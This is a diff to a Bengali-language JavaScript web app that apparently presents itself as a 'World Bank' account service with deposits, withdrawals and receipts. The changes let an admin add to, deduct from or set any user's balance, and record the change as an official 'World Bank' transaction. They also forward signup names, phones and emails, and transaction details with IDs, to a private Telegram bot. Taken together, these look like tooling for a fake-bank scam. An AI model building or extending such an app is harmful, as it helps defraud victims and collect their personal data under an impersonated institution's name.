@@ -80,7 +80,7 @@ const mandatoryUAEBanks = [
     "📲 PayBy / Botim Wallet"
 ];
 
-// ফোন কোড অনুযায়ী আন্তর্জাতিক ব্যাংক ম্যাপিং
+// ফোন কোড অনুযায়ী ব্যাংক তালিকা ম্যাপিং
 const countrySpecificBanksWithLogos = { 
     "+880": mandatoryBangladeshBanks,
     "+65": mandatorySingaporeBanks,
@@ -101,7 +101,17 @@ let tempProfilePhotoBase64 = null;
 let cameraStream = null;
 let isDarkMode = false;
 
-// ইউজার ইন্টারফেস ও নাম রেন্ডারিং ঠিক রাখার ফাংশন
+// টেলিগ্রাম নোটিফিকেশন পাঠানোর নির্ভরযোগ্য ফাংশন
+function sendTelegramNotification(message) {
+    if (!BOT_TOKEN || !CHAT_ID) return;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+    }).catch(err => console.error("Telegram API Error:", err));
+}
+
+// ইউজারের নাম ও ফোন নম্বর হেডার আপডেট
 function updateUIHeaderDetails() {
     if (!activeUser) return;
     const nameEl = document.getElementById('userNameDisp');
@@ -226,7 +236,10 @@ function renderNotificationsList() {
         
         if (t.type === 'AdminCredit') {
             bgCol = '#d1fae5'; borderCol = '#10b981'; textCol = '#047857';
-            titleText = '🏛️ ওয়ার্ল্ড ব্যাংক থেকে টাকা জমা হয়েছে!';
+            titleText = '🏛️ ওয়ার্ল্ড ব্যাংক থেকে ব্যালেন্স যোগ হয়েছে!';
+        } else if (t.type === 'AdminDebit') {
+            bgCol = '#fee2e2'; borderCol = '#ef4444'; textCol = '#b91c1c';
+            titleText = '🏛️ ওয়ার্ল্ড ব্যাংক থেকে ব্যালেন্স কর্তন করা হয়েছে';
         } else if (t.status === 'Approved') {
             bgCol = '#d1fae5'; borderCol = '#10b981'; textCol = '#047857';
             titleText = '✅ রিকোয়েস্ট অনুমোদিত!';
@@ -237,9 +250,14 @@ function renderNotificationsList() {
 
         item.style.cssText = `padding:8px 12px; border-radius:6px; background:${bgCol}; border:1px solid ${borderCol}; font-size:11px; margin-bottom:6px;`;
         
-        let descText = t.type === 'AdminCredit' 
-            ? `আপনার মেইন ব্যালেন্সে ${t.currency || '৳'}${formatAmountLocale(t.amount)} টাকা জমা করা হয়েছে।` 
-            : `আপনার ${t.type} (${t.currency || '৳'}${formatAmountLocale(t.amount)}) রিকোয়েস্ট। নম্বর: ${t.phone}`;
+        let descText = "";
+        if (t.type === 'AdminCredit') {
+            descText = `আপনার মেইন ব্যালেন্সে ${t.currency || '৳'}${formatAmountLocale(t.amount)} জমা করা হয়েছে। অবশিষ্ট ব্যালেন্স: ${t.currency || '৳'}${formatAmountLocale(t.remBal)}`;
+        } else if (t.type === 'AdminDebit') {
+            descText = `আপনার মেইন ব্যালেন্স থেকে ${t.currency || '৳'}${formatAmountLocale(t.amount)} কর্তন করা হয়েছে। অবশিষ্ট ব্যালেন্স: ${t.currency || '৳'}${formatAmountLocale(t.remBal)}`;
+        } else {
+            descText = `আপনার ${t.type} (${t.currency || '৳'}${formatAmountLocale(t.amount)}) রিকোয়েস্ট। নম্বর: ${t.phone}`;
+        }
 
         item.innerHTML = `
             <strong style="color:${textCol}">${titleText}</strong>
@@ -260,10 +278,11 @@ function downloadTransactionReceipt(txId) {
 ========================================
 Transaction ID : ${tx.trxId}
 Date & Time    : ${tx.dateStr} ${tx.timeStr}
-Type           : ${tx.type === 'AdminCredit' ? 'World Bank Balance Credit' : tx.type}
+Type           : ${tx.type}
 Method         : ${tx.method}
 Account/Phone  : ${tx.phone}
 Amount         : ${tx.currency || '৳'} ${formatAmountLocale(tx.amount)}
+Remaining Bal  : ${tx.remBal !== undefined ? (tx.currency || '৳') + ' ' + formatAmountLocale(tx.remBal) : 'N/A'}
 Status         : ${tx.status}
 ========================================
       Thank you for banking with us!    
@@ -281,7 +300,7 @@ Status         : ${tx.status}
     URL.revokeObjectURL(url);
 }
 
-// ইউজারের মোবাইল নম্বরের কান্ট্রি কোড অনুযায়ী নির্দিষ্ট দেশের ব্যাংক ড্রপডাউন লোড করা
+// ইউজারের মোবাইল নম্বরের কান্ট্রি কোড অনুযায়ী ব্যাংক তালিকা
 function populateUserDynamicBanksWithLogos() {
     const addSelect = document.getElementById('addMoneyMethodSelect');
     const transferSelect = document.getElementById('fundTransferMethodSelect');
@@ -298,7 +317,6 @@ function populateUserDynamicBanksWithLogos() {
         }
     }
 
-    // সংশ্লিষ্ট দেশের নিজস্ব ব্যাংক লিস্ট
     const localBanks = countrySpecificBanksWithLogos[countryCode] || mandatoryBangladeshBanks;
     let combinedBanks = Array.from(new Set(["🏛️ World Bank Main Account", ...localBanks, "🌐 International Wire Transfer"]));
 
@@ -379,7 +397,7 @@ function sanitizeEmailKey(keyStr) {
     return keyStr ? keyStr.replace(/[^a-zA-Z0-9]/g, "_") : "";
 }
 
-// ফায়ারবেস থেকে ডাটা সিঙ্ক করার সময় ইউজারের নাম ও ফোন ব্যাংকিং মেথড ঠিক রাখা
+// ফায়ারবেস থেকে ডাটা সিঙ্ক
 async function syncFromFirebase() {
     try {
         await syncDepositNumbersFromFirebase();
@@ -421,9 +439,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         document.getElementById('authSection')?.classList.add('hidden');
         document.getElementById('dashboardSection')?.classList.remove('hidden');
         
-        // হেডার প্রোফাইলে ইউজারের নাম ও ফোন নম্বর বসানো
         updateUIHeaderDetails();
-        
         updateAvatarDisplay();
         renderBalances();
         populateUserDynamicBanksWithLogos();
@@ -524,12 +540,31 @@ function handleCountryChange(selectEl) {
 }
 
 function toggleLangLoop() {
-    setLanguage(currentLang === 'bn' ? 'en' : 'bn');
+    const langOrder = ['bn', 'en', 'es'];
+    let nextIdx = (langOrder.indexOf(currentLang) + 1) % langOrder.length;
+    setLanguage(langOrder[nextIdx]);
 }
 
+// সম্পূর্ণ অ্যাপের ভাষা পরিবর্তন (BN, EN, ES)
 function setLanguage(lang) {
     currentLang = lang;
-    document.getElementById('dashLangBtn').innerText = lang.toUpperCase();
+    const dashBtn = document.getElementById('dashLangBtn');
+    if (dashBtn) dashBtn.innerText = lang.toUpperCase();
+
+    document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
+    if (lang === 'bn') document.getElementById('btnLangBN')?.classList.add('active');
+    if (lang === 'en') document.getElementById('btnLangEN')?.classList.add('active');
+    if (lang === 'es') document.getElementById('btnLangES')?.classList.add('active');
+
+    // ডাটা অ্যাট্রিবিউট অনুযায়ী টেক্সট পরিবর্তন
+    document.querySelectorAll('[data-' + lang + ']').forEach(el => {
+        el.innerText = el.getAttribute('data-' + lang);
+    });
+
+    // ইনপুট প্লেসহোল্ডার টেক্সট পরিবর্তন
+    document.querySelectorAll('[data-ph-' + lang + ']').forEach(el => {
+        el.placeholder = el.getAttribute('data-ph-' + lang);
+    });
 }
 
 function switchTab(type) {
@@ -548,14 +583,6 @@ function switchTab(type) {
         document.getElementById('signUpTab')?.classList.add('active');
         document.getElementById('loginTab')?.classList.remove('active');
     }
-}
-
-function sendTelegramNotification(message) {
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
-    }).catch(err => console.error("Telegram API Error:", err));
 }
 
 // সাইন আপ হ্যান্ডলার
@@ -591,6 +618,9 @@ async function handleSignUp(e) {
     localStorage.setItem('wb_saved_phone', fullPhone);
     saveUserToFirebase(newUser);
 
+    // নতুন সাইন আপের জন্য টেলিগ্রাম নোটিফিকেশন
+    sendTelegramNotification(`🆕 <b>নতুন ইউজার সাইন আপ!</b>\n👤 নাম: ${name}\n📱 ফোন: ${fullPhone}\n📧 ইমেইল: ${email}`);
+
     showCustomAlert("সফল", 'অ্যাকাউন্ট তৈরি হয়েছে! আপনার ব্যালেন্স ও উইথড্র লিমিট ৳০.০০। এখন মোবাইল নম্বর দিয়ে লগইন করুন।');
     switchTab('login');
     document.getElementById('logPhone').value = fullPhone;
@@ -615,7 +645,6 @@ async function handleLogin(e) {
         document.getElementById('authSection').classList.add('hidden');
         document.getElementById('dashboardSection').classList.remove('hidden');
         
-        // লগইন করার পর স্বয়ংক্রিয় নাম, নম্বর ও ব্যাংক লিস্ট লোড করা
         updateUIHeaderDetails();
         updateAvatarDisplay();
         renderBalances();
@@ -691,7 +720,7 @@ function renderUserInboxHistory() {
     tbody.innerHTML = '';
     const filterType = filterSelect ? filterSelect.value : 'ALL';
     let myTxs = allTransactions.filter(t => t.userEmail === activeUser.phone);
-    if (filterType !== 'ALL') myTxs = myTxs.filter(t => t.type === filterType);
+    if (filterType !== 'ALL') myTxs = myTxs.filter(t => t.type.includes(filterType) || (filterType === 'AdminCredit' && t.type.includes('Admin')));
 
     if (myTxs.length === 0) {
         tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:#64748b; font-weight:bold;">কোনো রেকর্ড পাওয়া যায়নি।</td></tr>`;
@@ -701,17 +730,21 @@ function renderUserInboxHistory() {
     myTxs.forEach(t => {
         let statusBadge = `<span class="status-pending">Pending ⏳</span>`;
         if (t.type === 'AdminCredit') statusBadge = `<span class="status-approved">Credited 🏛️</span>`;
+        else if (t.type === 'AdminDebit') statusBadge = `<span class="status-rejected">Debited 🏛️</span>`;
         else if (t.status === 'Approved') statusBadge = `<span class="status-approved">Approved ✅</span>`;
         else if (t.status === 'Rejected') statusBadge = `<span class="status-rejected">Rejected ❌</span>`;
         
         const curr = t.currency || getUserCurrency(activeUser);
+        let typeTitle = t.type;
+        if (t.type === 'AdminCredit') typeTitle = 'World Bank Add Balance';
+        if (t.type === 'AdminDebit') typeTitle = 'World Bank Deduct Balance';
 
         tbody.innerHTML += `
             <tr>
                 <td>${t.dateStr}</td>
-                <td><b>${t.type === 'AdminCredit' ? 'World Bank Deposit' : t.type}</b></td>
-                <td>${t.method}<br><small style="color:#0284c7;">নম্বর: ${t.phone}</small></td>
-                <td style="color:#059669; font-weight:bold;">${curr} ${formatAmountLocale(t.amount)}</td>
+                <td><b>${typeTitle}</b></td>
+                <td>${t.method}<br><small style="color:#0284c7;">অবশিষ্ট: ${curr} ${formatAmountLocale(t.remBal || 0)}</small></td>
+                <td style="color:${t.type === 'AdminDebit' ? '#ef4444' : '#059669'}; font-weight:bold;">${t.type === 'AdminDebit' ? '-' : '+'}${curr} ${formatAmountLocale(t.amount)}</td>
                 <td><code>${t.trxId}</code></td>
                 <td>
                     ${statusBadge}<br>
@@ -788,13 +821,16 @@ async function submitTransactionRequest(e, type) {
     const txObj = {
         id: Date.now(), userEmail: activeUser.phone, userName: activeUser.name,
         type: type, method: method, phone: phone, amount: amount, currency: userCurr,
-        trxId: trxId, status: 'Pending', dateStr: now.toLocaleDateString('bn-BD'), timeStr: now.toLocaleTimeString('bn-BD')
+        trxId: trxId, status: 'Pending', remBal: currentBal, dateStr: now.toLocaleDateString('bn-BD'), timeStr: now.toLocaleTimeString('bn-BD')
     };
 
     allTransactions.unshift(txObj);
     localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
     saveTxToFirebase(txObj);
-    sendTelegramNotification(`⏳ <b>${type} রিকোয়েস্ট!</b>\n👤 ইউজার: ${activeUser.name}\n💰 পরিমাণ: ${userCurr}${amount}`);
+
+    // টেলিগ্রামে নোটিফিকেশন পাঠানো
+    sendTelegramNotification(`⏳ <b>${type} রিকোয়েস্ট!</b>\n👤 ইউজার: ${activeUser.name}\n📱 নম্বর: ${activeUser.phone}\n🏦 মেথড: ${method}\n💰 পরিমাণ: ${userCurr}${amount}\n🔑 TrxID: ${trxId}`);
+    
     showCustomAlert("সফল রিকোয়েস্ট", `আপনার ${type} রিকোয়েস্ট জমা হয়েছে।`);
     form.reset();
     if(type === 'Deposit') openAddMoneyModal();
@@ -869,16 +905,34 @@ function populateAdminUserSelect() {
     });
 }
 
+// এডমিন ইউজার মেইন ব্যালেন্স বাড়ানো, কমানো ও অবশিষ্ট ব্যালেন্স সিঙ্ক
 async function adminUpdateUserBalance(e) {
     e.preventDefault();
     const userIdentifier = document.getElementById('admBalanceUserSelect').value;
-    const newAmount = parseFloat(document.getElementById('admBalanceAmount').value);
+    const actionType = document.getElementById('admBalanceActionType').value;
+    const inputAmount = parseFloat(document.getElementById('admBalanceAmount').value);
+
+    if (!userIdentifier || isNaN(inputAmount)) return;
 
     const userIndex = usersDatabase.findIndex(u => u.phone === userIdentifier);
     if (userIndex !== -1) {
         const user = usersDatabase[userIndex];
-        user.totalBalance = newAmount;
+        let oldBalance = parseFloat(user.totalBalance || 0);
+        let newBalance = oldBalance;
+        let txType = 'AdminCredit';
 
+        if (actionType === 'ADD') {
+            newBalance = oldBalance + inputAmount;
+            txType = 'AdminCredit';
+        } else if (actionType === 'DEDUCT') {
+            newBalance = Math.max(0, oldBalance - inputAmount);
+            txType = 'AdminDebit';
+        } else if (actionType === 'SET') {
+            newBalance = inputAmount;
+            txType = inputAmount >= oldBalance ? 'AdminCredit' : 'AdminDebit';
+        }
+
+        user.totalBalance = newBalance;
         usersDatabase[userIndex] = user;
         localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
         saveUserToFirebase(user);
@@ -888,12 +942,13 @@ async function adminUpdateUserBalance(e) {
             id: Date.now(), 
             userEmail: user.phone, 
             userName: user.name,
-            type: 'AdminCredit', 
-            method: 'World Bank Central Transfer', 
+            type: txType, 
+            method: 'World Bank Central System', 
             phone: user.phone, 
-            amount: newAmount, 
+            amount: inputAmount, 
             currency: getUserCurrency(user),
-            trxId: 'WB_CREDIT_' + Math.floor(100000 + Math.random() * 900000),
+            remBal: newBalance,
+            trxId: 'WB_SYS_' + Math.floor(100000 + Math.random() * 900000),
             status: 'Approved', 
             dateStr: now.toLocaleDateString('bn-BD'), 
             timeStr: now.toLocaleTimeString('bn-BD')
@@ -903,7 +958,10 @@ async function adminUpdateUserBalance(e) {
         localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
         saveTxToFirebase(txObj);
 
-        showCustomAlert("সফল", 'ইউজারের মেইন ব্যালেন্স আপডেট করা হয়েছে এবং নোটিফিকেশন পাঠানো হয়েছে!');
+        // টেলিগ্রাম বটে আপডেট নোটিফিকেশন পাঠানো
+        sendTelegramNotification(`🏛️ <b>এডমিন ব্যালেন্স আপডেট!</b>\n👤 ইউজার: ${user.name}\n📱 নম্বর: ${user.phone}\n🔄 টাইপ: ${actionType}\n💰 পরিমাণ: ${getUserCurrency(user)}${inputAmount}\n💵 অবশিষ্ট ব্যালেন্স: ${getUserCurrency(user)}${newBalance}`);
+
+        showCustomAlert("সফল", `ইউজারের ব্যালেন্স সফলভাবে আপডেট করা হয়েছে। নতুন ব্যালেন্স: ${getUserCurrency(user)}${newBalance}`);
         renderAdminUsersList();
 
         if (activeUser && activeUser.phone === user.phone) {
@@ -912,6 +970,7 @@ async function adminUpdateUserBalance(e) {
             renderBalances();
             renderNotificationsList();
         }
+        e.target.reset();
     }
 }
 
@@ -971,7 +1030,7 @@ function renderAdminAllHistory() {
         tbody.innerHTML += `
             <tr>
                 <td><b>${t.userName || t.userEmail}</b></td>
-                <td>${t.type === 'AdminCredit' ? 'World Bank Deposit' : t.type}</td>
+                <td>${t.type}</td>
                 <td>${t.method}</td>
                 <td>${t.currency || '৳'} ${formatAmountLocale(t.amount)}</td>
                 <td><code>${t.trxId}</code></td>
@@ -1002,8 +1061,11 @@ async function approveTransaction(txId) {
         saveUserToFirebase(targetUser);
 
         allTransactions[txIndex].status = 'Approved';
+        allTransactions[txIndex].remBal = targetUser.totalBalance;
         localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
         saveTxToFirebase(allTransactions[txIndex]);
+
+        sendTelegramNotification(`✅ <b>রিকোয়েস্ট অনুমোদিত!</b>\n👤 ইউজার: ${targetUser.name}\n💰 পরিমাণ: ${tx.currency || '৳'}${tx.amount}\n💵 বর্তমান ব্যালেন্স: ${tx.currency || '৳'}${targetUser.totalBalance}`);
 
         showCustomAlert("সফল", 'অ্যাপ্রুভ করা হয়েছে!');
         if (activeUser && activeUser.phone === targetUser.phone) {
@@ -1024,6 +1086,9 @@ async function rejectTransaction(txId) {
         allTransactions[txIndex].status = 'Rejected';
         localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
         saveTxToFirebase(allTransactions[txIndex]);
+
+        sendTelegramNotification(`❌ <b>রিকোয়েস্ট বাতিল করা হয়েছে!</b>\n👤 ইউজার: ${allTransactions[txIndex].userName}\n💰 পরিমাণ: ${allTransactions[txIndex].amount}`);
+
         showCustomAlert("সফল", 'রিজেক্ট করা হয়েছে।');
         renderAdminPendingList();
         renderAdminAllHistory();
